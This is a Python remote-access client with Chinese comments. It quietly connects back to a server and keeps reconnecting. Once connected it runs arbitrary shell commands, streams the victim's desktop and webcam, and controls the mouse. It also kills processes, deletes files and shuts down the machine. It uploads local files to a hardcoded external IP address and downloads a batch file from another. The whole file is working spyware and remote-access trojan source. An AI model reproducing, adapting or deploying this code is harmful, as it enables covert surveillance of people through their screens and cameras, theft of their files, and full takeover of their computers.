import os
import sys
import json
import socket
import subprocess
import time
import threading
from datetime import datetime
import ctypes
import struct
import shutil
from encodings.utf_7 import encode
from serve import *
import requests
import subprocess
# 导入屏幕捕获和图像处理库
import cv2
import numpy as np
import pyautogui
from urllib.parse import urlparse
import psutil
pyautogui.FAILSAFE = False
# 全局变量，用于控制桌面流
streaming_desktop = False
desktop_thread = None
# 全局变量，用于控制摄像头流
streaming_webcam = False
webcam_thread = None
# 在文件顶部添加
client_socket_lock = threading.Lock()
# 修改capture_and_stream_desktop函数
def capture_and_stream_desktop(client_socket):
    """捕获并流式传输桌面画面"""
    global streaming_desktop

    try:
        # 设置屏幕捕获参数
        screen_width, screen_height = pyautogui.size()
        scaling_factor = min(1.0, 1280 / max(screen_width, screen_height))
        frame_interval = 0.1
        jpeg_quality = 80

        while streaming_desktop:
            try:
                # 捕获屏幕
                screenshot = pyautogui.screenshot()

                # 转换为OpenCV格式
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

                # 缩放图像
                if scaling_factor < 1.0:
                    new_width = int(screen_width * scaling_factor)
                    new_height = int(screen_height * scaling_factor)
                    frame = cv2.resize(frame, (new_width, new_height))

                # 压缩为JPEG
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                jpg_data = buffer.tobytes()

                # 使用锁发送数据
                with client_socket_lock:
                    # 检查连接是否依然有效
                    if not streaming_desktop:
                        break

                    # 发送大小
                    size = len(jpg_data)
                    client_socket.sendall(struct.pack('>I', size))

                    # 发送图像数据
                    client_socket.sendall(jpg_data)

                # 延迟控制帧率
                time.sleep(frame_interval)

            except Exception as e:
                # 内部异常处理，避免直接崩溃
                time.sleep(1)  # 遇到错误稍等一下
                if not streaming_desktop:
                    break

    except Exception as e:
        # 外部异常处理
        pass
    finally:
        streaming_desktop = False


def download_file_http(url, local_path, headers=None):
    """通过HTTP/HTTPS下载文件，带进度显示和错误处理"""
    try:
        # 创建目标目录
        directory = os.path.dirname(local_path)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)

        # 发起请求
        response = requests.get(url, stream=True, headers=headers, timeout=30)
        response.raise_for_status()  # 确保请求成功

        # 获取文件大小
        total_size = int(response.headers.get('content-length', 0))

        # 下载文件
        downloaded_size = 0
        start_time = time.time()

        with open(local_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    size = f.write(chunk)
                    downloaded_size += size

                    # 计算下载进度和速度
                    percent = int(downloaded_size * 100 / total_size) if total_size > 0 else 0
                    elapsed = time.time() - start_time
                    speed = downloaded_size / elapsed if elapsed > 0 else 0

                    # 记录进度（可以扩展为发送进度到服务器）
                    if total_size > 0:
                        progress_info = f"下载中: {percent}% - {downloaded_size}/{total_size} 字节 ({speed:.2f} B/s)"
                        # 这里可以记录到日志，无法直接发送给用户

        # 验证文件
        if os.path.exists(local_path):
            actual_size = os.path.getsize(local_path)
            if total_size > 0 and actual_size != total_size:
                return f"文件下载不完整: 预期 {total_size} 字节，实际 {actual_size} 字节"
            return f"文件成功下载到: {local_path} (大小: {actual_size} 字节)"
        else:
            return f"下载完成但找不到文件: {local_path}"

    except requests.exceptions.RequestException as e:
        return f"HTTP请求失败: {str(e)}"
    except Exception as e:
        return f"下载过程中出错: {str(e)}"


# HTTP文件上传函数，替代原来的SFTP上传
def upload_file_http(local_path):
    """通过HTTP/HTTPS上传文件，带进度显示和错误处理"""
    url = "http://103.56.114.31:3000/upload"

    # 打开文件并发送 POST 请求
    with open(local_path, "rb") as f:
        files = {'file': f}
        response = requests.post(url, files=files)

    print("[+] Response from server:", response.text)
def control_mouse(action, x=None, y=None):
    """控制鼠标动作"""
    try:
        if action == "move":
            if x is not None and y is not None:
                pyautogui.moveTo(x, y)
                return f"鼠标已移动到 ({x}, {y})"
            return "缺少坐标参数"
        elif action == "click":
            if x is not None and y is not None:
                pyautogui.click(x, y)
                return f"已在 ({x}, {y}) 点击鼠标"
            # 在当前位置点击
            pyautogui.click()
            return "已在当前位置点击鼠标"
        elif action == "doubleclick":
            if x is not None and y is not None:
                pyautogui.doubleClick(x, y)
                return f"已在 ({x}, {y}) 双击鼠标"
            # 在当前位置双击
            pyautogui.doubleClick()
            return "已在当前位置双击鼠标"
        elif action == "rightclick":
            if x is not None and y is not None:
                pyautogui.rightClick(x, y)
                return f"已在 ({x}, {y}) 右键点击"
            # 在当前位置右键点击
            pyautogui.rightClick()
            return "已在当前位置右键点击"
        else:
            return f"未知鼠标操作: {action}"
    except Exception as e:
        return f"鼠标操作失败: {e}"

def capture_and_stream_webcam(client_socket):
    """捕获并流式传输摄像头视频"""
    global streaming_webcam

    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            with client_socket_lock:  # 加锁发送错误信息
                client_socket.send("无法打开摄像头".encode())
            return

        frame_width = 640
        frame_height = 480
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, frame_width)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, frame_height)

        frame_interval = 0.1
        jpeg_quality = 80

        while streaming_webcam:
            ret, frame = cap.read()
            if not ret:
                break

            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality]
            _, buffer = cv2.imencode('.jpg', frame, encode_param)
            jpg_data = buffer.tobytes()

            try:
                with client_socket_lock:  # 加锁发送数据
                    if not streaming_webcam:  # 检查状态
                        break
                    size = len(jpg_data)
                    client_socket.sendall(struct.pack('>I', size))
                    client_socket.sendall(jpg_data)
                time.sleep(frame_interval)
            except:
                break

    except Exception as e:
        pass
    finally:
        streaming_webcam = False
        if 'cap' in locals() and cap.isOpened():
            cap.release()
def resource_path(relative_path):
    """ 获取资源文件的绝对路径 """
    if hasattr(sys, '_MEIPASS'):
        # PyInstaller 会将资源文件解压到 _MEIPASS 目录下
        base_path = sys._MEIPASS
    else:
        # 开发阶段使用当前文件所在目录
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
def change_wallpaper(image_path):
    """更改桌面壁纸"""
    try:
        # 检查文件是否存在
        if not os.path.exists(image_path):
            return f"文件不存在: {image_path}"

        # 获取绝对路径
        abs_path = os.path.abspath(image_path)

        # 更改壁纸 (Windows)
        if sys.platform.startswith('win'):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
            return f"壁纸已更改为: {abs_path}"
        # macOS
        elif sys.platform.startswith('darwin'):
            cmd = f"""osascript -e 'tell application "Finder" to set desktop picture to POSIX file "{abs_path}"'"""
            subprocess.run(cmd, shell=True)
            return f"壁纸已更改为: {abs_path}"
        # Linux (需要适当的桌面环境)
        elif sys.platform.startswith('linux'):
            # 尝试针对GNOME
            try:
                cmd = f"gsettings set org.gnome.desktop.background picture-uri file://{abs_path}"
                subprocess.run(cmd, shell=True)
                return f"壁纸已更改为: {abs_path}"
            except:
                return "更改壁纸失败，可能不支持您的桌面环境"
        else:
            return "不支持的操作系统平台"
    except Exception as e:
        return f"更改壁纸时出错: {e}"


def create_file_or_dir(path, content=None, is_file=True):
    """创建文件或目录"""
    try:
        if is_file:
            # 创建文件
            directory = os.path.dirname(path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)

            with open(path, 'w', encoding='utf-8') as file:
                if content:
                    file.write(content)
            return f"文件已创建: {path}"
        else:
            # 创建目录
            os.makedirs(path, exist_ok=True)
            return f"目录已创建: {path}"
    except Exception as e:
        return f"创建失败: {e}"


def delete_file_or_dir(path):
    """删除文件或目录"""
    try:
        if os.path.isfile(path):
            os.remove(path)
            return f"文件已删除: {path}"
        elif os.path.isdir(path):
            shutil.rmtree(path)
            return f"目录已删除: {path}"
        else:
            return f"路径不存在: {path}"
    except Exception as e:
        return f"删除失败: {e}"


def list_directory(path="."):
    """列出目录内容，并为每个项目提供模拟的坐标位置"""
    try:
        items = os.listdir(path)
        result = []

        # 添加当前路径
        current_path = os.path.abspath(path)
        result.append(f"当前路径: {current_path}")
        result.append("-" * 50)

        # 分类文件和目录
        directories = []
        files = []

        # 设置初始坐标和每行可显示的项目数
        x_start = 20
        y_start = 50
        x_increment = 100
        y_increment = 40
        items_per_row = 5

        # 当前处理的项目索引
        index = 0

        for item in items:
            full_path = os.path.join(path, item)

            # 计算项目的x,y坐标
            row = index // items_per_row
            col = index % items_per_row
            x = x_start + (col * x_increment)
            y = y_start + (row * y_increment)

            # 增加索引
            index += 1

            if os.path.isdir(full_path):
                directories.append({
                    "name": item,
                    "type": "目录",
                    "x": x,
                    "y": y
                })
            else:
                # 获取文件大小
                size = os.path.getsize(full_path)
                size_str = f"{size} B"
                if size > 1024:
                    size_str = f"{size / 1024:.2f} KB"
                if size > 1024 * 1024:
                    size_str = f"{size / (1024 * 1024):.2f} MB"

                # 获取修改时间
                mtime = os.path.getmtime(full_path)
                mtime_str = datetime.fromtimestamp(mtime).strftime('%Y-%m-%d %H:%M:%S')

                files.append({
                    "name": item,
                    "type": "文件",
                    "size": size_str,
                    "mtime": mtime_str,
                    "x": x,
                    "y": y
                })

        # 添加目录
        if directories:
            result.append("目录:")
            for dir_item in directories:
                result.append(f"[目录] {dir_item['name']} - 坐标: X={dir_item['x']}, Y={dir_item['y']}")
            result.append("")

        # 添加文件
        if files:
            result.append("文件:")
            for file_item in files:
                result.append(
                    f"[文件] {file_item['name']} - {file_item['size']} - {file_item['mtime']} - 坐标: X={file_item['x']}, Y={file_item['y']}")

        return "\n".join(result)
    except Exception as e:
        return f"获取目录内容失败: {e}"
def run_program(path):
    """运行程序"""
    try:
        if not os.path.exists(path):
            return f"程序不存在: {path}"

        # 使用子进程启动程序
        subprocess.Popen(path, shell=True)
        return f"已启动程序: {path}"
    except Exception as e:
        return f"启动程序失败: {e}"


def connect_to_server(server_address, server_port, retry_interval=5):
    """尝试连接到服务器，失败后自动重试"""
    client_socket = socket.socket()

    while True:
        try:
            #print(f"正在连接服务器: {server_address}:{server_port}...")
            client_socket.settimeout(10)  # 设置连接超时时间
            client_socket.connect((server_address, server_port))
            #print(f"已成功连接到服务器: {server_address}:{server_port}")
            client_socket.settimeout(None)  # 连接成功后重置超时
            return client_socket

        except socket.timeout:
            #print(f"连接超时，{retry_interval}秒后重试...")
            time.sleep(retry_interval)
            client_socket = socket.socket()  # 创建新的socket对象

        except ConnectionRefusedError:
            #print(f"连接被拒绝，服务器可能未启动，{retry_interval}秒后重试...")
            time.sleep(retry_interval)
            client_socket = socket.socket()  # 创建新的socket对象

        except Exception as e:
           # print(f"连接出错: {e}，{retry_interval}秒后重试...")
            time.sleep(retry_interval)
            client_socket = socket.socket()  # 创建新的socket对象


def run_client():
    """运行客户端"""
    global streaming_desktop, desktop_thread, streaming_webcam, webcam_thread

    # 设置连接参数
    server_address = "127.0.0.1"
    server_port = 3000

    # 获取本机信息
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    while True:
        try:
            # 连接到服务器（持续尝试直到成功）
            client_socket = connect_to_server(server_address, server_port)

            # 发送初始信息
            system_info = f"主机名: {hostname}, IP地址: {ip_address}, 操作系统: {sys.platform}"
            client_socket.send(system_info.encode())

            # 处理命令
            while True:
                try:
                    # 接收命令
                    data = client_socket.recv(8192)
                    if not data:
                       # print("服务器已断开连接")
                        break

                    # 解析命令
                    command_data = data.decode()
                    #print(f"收到命令: {command_data}")

                    # 处理JSON格式命令
                    if command_data.startswith("{"):
                        try:
                            cmd_obj = json.loads(command_data)
                            command = cmd_obj.get("command", "").lower()

                            if command == "mkdir":
                                path = cmd_obj.get("path", "")
                                is_file = cmd_obj.get("is_file", False)
                                content = cmd_obj.get("content", "")
                                response = create_file_or_dir(path, content, is_file)
                                with client_socket_lock:
                                    client_socket.send(response.encode())

                            elif command == "delete":
                                path = cmd_obj.get("path", "")
                                response = delete_file_or_dir(path)
                                with client_socket_lock:
                                    client_socket.send(response.encode())
                            elif command == "dos":
                                dos = cmd_obj.get("dos", "")
                                result = subprocess.run(dos, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                                try:
                                    # 使用 gbk 解码 Windows 控制台输出
                                    stdout = result.stdout.decode('gbk')
                                    stderr = result.stderr.decode('gbk')

                                    if stderr:
                                        response = f"命令执行出错: {stderr}"
                                    else:
                                        response = f"dos命令已经执行完成！详细内容:\n{stdout}"

                                    client_socket.send(response.encode('utf-8'))  # 再以 utf-8 发送给客户端

                                except Exception as e:
                                    client_socket.send(f"dos 命令执行失败，详细信息:{e}".encode('utf-8'))
                            elif command == "ls":
                                path = cmd_obj.get("path", ".")
                                response = list_directory(path)
                                with client_socket_lock:
                                     client_socket.send(response.encode())

                            elif command == "cd":
                                path = cmd_obj.get("path", "")
                                try:
                                    os.chdir(path)
                                    response = f"目录已更改为: {os.getcwd()}"
                                except Exception as e:
                                    response = f"更改目录失败: {e}"
                                    with client_socket_lock:
                                        client_socket.send(response.encode())

                            elif command == "desktop":
                                start = cmd_obj.get("start", False)

                                if start and not streaming_desktop:
                                    # 开始桌面流
                                    streaming_desktop = True
                                    response = "准备发送桌面画面..."
                                    with client_socket_lock:
                                        client_socket.send(response.encode())

                                    # 创建线程发送桌面画面
                                    desktop_thread = threading.Thread(target=capture_and_stream_desktop,
                                                                      args=(client_socket,))
                                    desktop_thread.daemon = True
                                    desktop_thread.start()

                                elif not start and streaming_desktop:
                                    # 停止桌面流
                                    streaming_desktop = False
                                    response = "正在停止桌面画面传输..."
                                    with client_socket_lock:
                                        client_socket.send(response.encode())

                                    # 等待线程结束
                                if desktop_thread and desktop_thread.is_alive():
                                    try:
                                        desktop_thread.join(2)  # 加入超时
                                    except Exception as e:
                                        pass

                                elif start and streaming_desktop:
                                    response = "桌面画面已经在传输中"
                                    with client_socket_lock:
                                        client_socket.send(response.encode())

                                else:
                                    response = "桌面画面传输已经停止"
                                    with client_socket_lock:
                                        client_socket.send(response.encode())

                            elif command == "change1":
                                path= resource_path("beat.jpg")
                                response = change_wallpaper(path)
                                with client_socket_lock:
                                 client_socket.send(response.encode())
                            elif command=='change2':
                                path = resource_path("yujie.jpg")
                                response = change_wallpaper(path)
                                with client_socket_lock:
                                 client_socket.send(response.encode())
                            elif command == "change0":
                                path= resource_path("./happig.jpg")
                                response = change_wallpaper(path)
                                with client_socket_lock:
                                 client_socket.send(response.encode())
                            elif command == "start":
                                path = cmd_obj.get("path", "")
                                response = run_program(path)
                                with client_socket_lock:
                                    client_socket.send(response.encode())

                            # 在处理JSON格式命令的部分添加以下代码（在elif command == "webcam"之前）
                            # 在处理简单字符串命令的else部分中增加处理mouse命令的代码
                            elif command == "mouse":  # 注意这里是 == 而不是 startswith
                                action = cmd_obj.get("action", "")
                                x = cmd_obj.get("x")
                                y = cmd_obj.get("y")
                                response = control_mouse(action, x, y)
                                client_socket.send(response.encode())

                            elif command == "webcam":
                                start = cmd_obj.get("start", False)

                                if start and not streaming_webcam:
                                    # 开始摄像头流
                                    streaming_webcam = True
                                    response = "准备发送摄像头画面..."
                                    with client_socket_lock:
                                     client_socket.send(response.encode())

                                    # 创建线程发送摄像头画面
                                    webcam_thread = threading.Thread(target=capture_and_stream_webcam,
                                                                     args=(client_socket,))
                                    webcam_thread.daemon = True
                                    webcam_thread.start()

                                elif not start and streaming_webcam:
                                    # 停止摄像头流
                                    streaming_webcam = False
                                    response = "正在停止摄像头画面传输..."
                                    with client_socket_lock:
                                        client_socket.send(response.encode())

                                    # 等待线程结束
                                    if webcam_thread and webcam_thread.is_alive():
                                        try:
                                            webcam_thread.join(2)
                                        except Exception as e:
                                            pass

                                elif start and streaming_webcam:
                                    response = "摄像头画面已经在传输中"
                                    with client_socket_lock:
                                        client_socket.send(response.encode())

                                else:
                                    response = "摄像头画面传输已经停止"
                                    with client_socket_lock:
                                     client_socket.send(response.encode())

                            # 在run_client()函数的命令处理部分添加或替换以下代码
                            elif command == "http_download":
                                url = "http://47.109.201.222:8000/file1/chage.bat"

                                # 从 URL 提取文件名
                                parsed_url = urlparse(url)
                                filename = parsed_url.path.split('/')[-1]

                                # 下载文件
                                with requests.get(url, stream=True) as r:
                                    r.raise_for_status()
                                    with open(f"D:/{filename}", 'wb') as f:
                                        for chunk in r.iter_content(chunk_size=8192):
                                            if chunk:
                                                f.write(chunk)

                                print(f"文件已保存为：{filename}")

                            elif command == "http_upload":
                               # url = cmd_obj.get("url", "")
                                #print(url)
                                local_path = cmd_obj.get("local_path", "")
                                #field_name = cmd_obj.get("field_name", "file")
                                #extra_data = cmd_obj.get("extra_data", None)

                                upload_file_http(local_path)
                                print(local_path)
                                response="文件已上传！"
                                with client_socket_lock:
                                    client_socket.send(response.encode())
                            else:
                                response = f"未知JSON命令: {command}"
                                with client_socket_lock:
                                    client_socket.send(response.encode())

                        except json.JSONDecodeError:
                            response = "无效的JSON格式"
                            with client_socket_lock:
                                client_socket.send(response.encode())

                    # 处理简单字符串命令
                    else:
                        command = command_data.lower()

                        if command == "exit":
                            #print("收到退出命令，关闭连接")
                            client_socket.send("客户端已关闭".encode())
                            sys.exit()
                        elif command.lower() == 'ps':
                            columns = ['name', 'pid', 'username', 'cpu_percent', 'memory_percent', 'create_time']
                            processes = []

                            for p in psutil.process_iter(attrs=columns):
                                try:
                                    processes.append(p.info)
                                except psutil.NoSuchProcess:
                                    continue

                            # 发送 JSON 格式的进程列表给客户端
                            client_socket.send(json.dumps(processes).encode('utf-8'))
                        elif command=="deskscreen":
                            start_screen()
                        elif command == "ps-kill":
                            try:
                                # 接收客户端发来的 PID 或进程名
                                kill_target = client_socket.recv(1024).decode().strip()

                                if not kill_target:
                                    client_socket.send("未收到有效的 PID 或进程名。".encode())
                                    continue

                                # 判断是 PID 还是进程名
                                if kill_target.isdigit():
                                    pid = int(kill_target)
                                    try:
                                        p = psutil.Process(pid)
                                        p.kill()
                                        client_socket.send(f"PID {pid} 已成功杀死！".encode())
                                    except psutil.NoSuchProcess:
                                        client_socket.send(f"进程 PID {pid} 不存在。".encode())
                                    except psutil.AccessDenied:
                                        client_socket.send("权限不足，无法终止该进程，请以管理员身份运行。".encode())
                                    except Exception as e:
                                        client_socket.send(f"终止进程失败：{str(e)}".encode())

                                else:
                                    # 按进程名终止所有匹配的进程
                                    killed_any = False
                                    for proc in psutil.process_iter(['pid', 'name']):
                                        try:
                                            if proc.info['name'] and kill_target.lower() in proc.info['name'].lower():
                                                proc.kill()
                                                killed_any = True
                                        except psutil.NoSuchProcess:
                                            continue
                                        except psutil.AccessDenied:
                                            client_socket.send(
                                                f"权限不足，无法终止进程：{proc.info['name']} (PID: {proc.info['pid']})，请以管理员身份运行。".encode())
                                            continue

                                    if killed_any:
                                        client_socket.send(f"已尝试终止所有包含名称 '{kill_target}' 的进程。".encode())
                                    else:
                                        client_socket.send(f"未找到与名称 '{kill_target}' 匹配的进程。".encode())

                            except ValueError:
                                client_socket.send("收到的数据不是有效的 PID 或进程名。".encode())
                            except Exception as e:
                                client_socket.send(f"发生错误：{str(e)}".encode())
                        elif command == "shutdown":
                            response = "正在关机..."
                            with client_socket_lock:
                                client_socket.send(response.encode())
                            time.sleep(1)

                            if sys.platform.startswith('win'):
                                os.system("shutdown /s /t 5")
                            else:
                                os.system("shutdown -h now")
                            break
                        elif command == "reboot":
                            response = "正在重启..."
                            with client_socket_lock:
                                client_socket.send(response.encode())
                            time.sleep(1)

                            if sys.platform.startswith('win'):
                                os.system("shutdown /r /t 5")
                            else:
                                os.system("reboot")
                            break
                        # 在处理简单字符串命令的else部分中增加这些条件判断
                        elif command_data.lower().startswith("mouse"):
                            try:
                                # 解析命令行参数
                                parts = command_data.strip().split()
                                if len(parts) >= 4:
                                    action = parts[1]
                                    x = int(parts[2])
                                    y = int(parts[3])

                                    # 调用控制鼠标函数
                                    response = control_mouse(action, x, y)
                                    client_socket.send(response.encode())
                                else:
                                    response = "鼠标命令格式错误，正确格式: mouse [move/click/doubleclick/rightclick] [x] [y]"
                                    with client_socket_lock:
                                        client_socket.send(response.encode())
                            except Exception as e:
                                response = f"处理鼠标命令出错: {e}"
                                with client_socket_lock:
                                    client_socket.send(response.encode())
                        elif command_data.lower().startswith("sleep"):
                            sys.exit()
                        else:
                            response = f"未知命令: {command}"
                            with client_socket_lock:
                                client_socket.send(response.encode())

                except Exception as e:
                    #print(f"处理命令时出错: {e}")
                    pass
                    try:
                        with client_socket_lock:
                         client_socket.send(f"错误: {e}".encode())
                    except:
                       # print("无法发送错误响应，连接可能已断开")
                        break

        except Exception as e:
            pass

        finally:
            # 确保桌面流和摄像头流已停止
            streaming_desktop = False
            streaming_webcam = False

            # 关闭连接
            try:
                client_socket.close()
            except:
                pass
            time.sleep(5)  # 等待5秒后尝试重新连接

if __name__ == "__main__":
   # print("远程控制客户端 v1.0")
    #print("正在启动远程控制服务...")
    run_client()